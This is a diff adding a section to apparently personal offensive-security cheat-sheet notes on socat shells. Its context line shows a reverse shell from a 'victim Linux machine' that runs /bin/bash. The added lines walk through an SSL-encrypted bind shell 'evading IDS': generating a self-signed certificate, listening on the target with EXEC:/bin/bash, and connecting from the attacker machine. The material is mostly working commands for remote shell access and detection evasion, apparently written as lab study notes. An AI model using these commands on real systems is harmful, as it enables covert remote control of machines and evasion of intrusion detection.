@@ -57,6 +57,29 @@ and on the victim Linux machine:
 socat TCP4:10.11.0.22:443 EXEC:/bin/bash      #check by whoami or id commands
 
 ## Socat Encrypted Bind Shells
+# evading IDS with SSL encryption //openssl
+
+#generate key:
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt    #enter the data, Coutry, Name, e-mail etc.
+          ##
+          • req: initiate a new certificate signing request
+          • -newkey: generate a new private key
+          • rsa:2048: use RSA encryption with a 2,048-bit key length.
+          • -nodes: store the private key without passphrase protection
+          • -keyout: save the key to a file
+          • -x509: output a self-signed certificate instead of a certificate request
+          • -days: set validity period in days
+          • -out: save the certificate to a file
+          
+#combine bind shell key and bind shell cert files into single .pem file
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+# create encrypted socat listener (on "target" machine):
+sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+# on attacker machine:
+socat - OPENSSL:10.11.0.4:443,verify=0 --> start type commands that will be executed on the target
+          verify=0 disable ssl verification (because our cert is self signed)
+
+#4.3 PowerShell and Powercat
 
 
 
